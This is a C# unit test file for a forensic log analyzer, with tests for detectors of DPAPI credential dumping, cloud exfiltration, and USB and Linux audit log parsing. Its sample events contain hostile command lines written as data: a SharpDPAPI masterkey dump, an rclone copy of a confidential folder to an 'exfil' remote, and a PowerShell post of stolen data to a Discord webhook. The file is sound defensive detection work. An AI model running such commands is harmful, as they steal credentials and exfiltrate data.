using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using LogAnalyzer.Core.Models;
using LogAnalyzer.Core.Services;
using LogAnalyzer.Infrastructure.Parsers;
using Xunit;

namespace LogAnalyzer.UI.Tests
{
    public class AdvancedDfirMilestone5Tests
    {
        [Fact]
        public void DpapiLsassAuditor_DetectsVaultReadingAndSharpDpapi()
        {
            var auditor = new DpapiLsassAuditor();
            var events = new List<ParsedEvent>
            {
                new ParsedEvent
                {
                    EventId = 5379,
                    TimeCreated = DateTime.UtcNow,
                    MachineName = "HOST-CORP-01",
                    Message = "An attempt was made to read a credential from the Vault. Schema: Web Credentials"
                },
                new ParsedEvent
                {
                    EventId = 4688,
                    TimeCreated = DateTime.UtcNow.AddMinutes(1),
                    MachineName = "HOST-CORP-01",
                    Message = "A new process was created. Command Line: C:\\Temp\\SharpDPAPI.exe masterkeys"
                }
            };

            var findings = auditor.AuditEvents(events);

            Assert.NotNull(findings);
            Assert.Equal(2, findings.Count);
            Assert.Contains(findings, f => f.MitreTechniqueId == "T1555.004");
        }

        [Fact]
        public void LivingOffTheCloudEngine_DetectsRcloneAndDiscordWebhooks()
        {
            var engine = new LivingOffTheCloudEngine();
            var events = new List<ParsedEvent>
            {
                new ParsedEvent
                {
                    EventId = 4688,
                    TimeCreated = DateTime.UtcNow,
                    MachineName = "DATA-SERVER-01",
                    Message = "Process Create: rclone.exe copy C:\\Confidential remote:exfil_bucket"
                },
                new ParsedEvent
                {
                    EventId = 4104,
                    TimeCreated = DateTime.UtcNow.AddMinutes(1),
                    MachineName = "DATA-SERVER-01",
                    Message = "ScriptBlock: Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/12345/abcdef' -Method Post -Body $exfilData"
                }
            };

            var findings = engine.AnalyzeEvents(events);

            Assert.NotNull(findings);
            Assert.Equal(2, findings.Count);
            Assert.Contains(findings, f => f.MitreTechniqueId == "T1567.002"); // rclone
            Assert.Contains(findings, f => f.MitreTechniqueId == "T1567.001"); // webhook
        }

        [Fact]
        public async Task UsbAndCrossPlatformParsers_ExtractArtifactsAndEnforceInvariants()
        {
            var usbParser = new UsbForensicsParser();
            var linuxParser = new CrossPlatformLogsParser();

            string tempSetupApi = Path.Combine(Path.GetTempPath(), "setupapi.dev.log");
            string tempAuditLog = Path.Combine(Path.GetTempPath(), "audit.log");

            try
            {
                string setupApiContent = @"[Device Install (Hardware initiated) - USBSTOR\Disk&Ven_SanDisk&Prod_Ultra_Fit&Rev_1.00\0123456789ABCDEF&0]";
                File.WriteAllText(tempSetupApi, setupApiContent);

                string auditLogContent = @"type=EXECVE msg=audit(1620000000.000:123): argc=2 a0=""/bin/bash"" a1=""-c""";
                File.WriteAllText(tempAuditLog, auditLogContent);

                Assert.True(usbParser.CanParse(tempSetupApi));
                Assert.True(linuxParser.CanParse(tempAuditLog));

                var usbResults = await usbParser.ParseAsync(tempSetupApi, "HOST-PC-01");
                Assert.NotEmpty(usbResults);
                Assert.Equal("Dispozitiv USB Conectat (setupapi.dev.log)", usbResults[0].ArtifactType);
                Assert.True(usbResults[0].Properties.ContainsKey("Hardware Serial Number (P16)"));
                Assert.Equal("0123456789ABCDEF&0", usbResults[0].Properties["Hardware Serial Number (P16)"]);

                var linuxResults = await linuxParser.ParseAsync(tempAuditLog, "LINUX-SERVER-01");
                Assert.NotEmpty(linuxResults);
                Assert.Equal("Linux auditd Execve / Syscall", linuxResults[0].ArtifactType);
                Assert.Equal("bash", linuxResults[0].Name);
            }
            finally
            {
                if (File.Exists(tempSetupApi)) File.Delete(tempSetupApi);
                if (File.Exists(tempAuditLog)) File.Delete(tempAuditLog);
            }
        }
    }
}
